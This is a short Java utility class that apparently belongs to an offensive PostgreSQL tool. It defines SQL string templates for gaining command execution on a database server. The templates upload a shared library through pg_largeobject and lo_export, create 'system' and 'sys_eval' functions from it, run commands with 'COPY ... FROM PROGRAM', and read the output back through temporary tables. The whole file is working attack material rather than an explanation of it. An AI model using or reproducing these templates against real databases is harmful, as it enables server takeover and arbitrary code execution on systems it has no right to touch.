package Util;

/**
 * @author ch1ng
 * @date 2022/4/10
 */
public class PostgreSqlUtil {

    public static String checkSql = "select '%s'";
    public static String versionInfoSql = "SELECT version() as v;";
    public static String serverVersionInfoSql = "SHOW server_version";
    public static String libSql = "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ''%s'', ''system'' LANGUAGE ''c'' STRICT;";
    public static String injectSql = "INSERT INTO pg_largeobject VALUES (%d, %d, decode('%s', 'hex'));";
    public static String locreateSql = "SELECT lo_create(%s);";
    public static String loexportSql = "SELECT lo_export(%s,'%s');";
    public static String createSql = "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' " +
            "LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;";
    public static String lounlinkSql = "SELECT lo_unlink (%s);";
    public static String createTempTableSql = "CREATE TABLE sectest111(t TEXT);";
    public static String redirectSql = "select system('%s > %s') as s;";
    public static String copySql = "COPY sectest111 FROM '%s';";
    public static String selectTempTableSql = "SELECT * FROM sectest111;";
    public static String dropTempTableSql = "drop table sectest111;";
    public static String evalSql = "select sys_eval('%s');";
    public static String dropCmdtableSql = "DROP TABLE IF EXISTS cmd_exec;";
    public static String createCmdtableSql = "CREATE TABLE cmd_exec(cmd_output text);";
    public static String runCmdSql = "COPY cmd_exec FROM PROGRAM '%s';";
    public static String selectCmdResSql = "SELECT * FROM cmd_exec;";
    public static String dropEvalSql = "drop function sys_eval(text);";

}
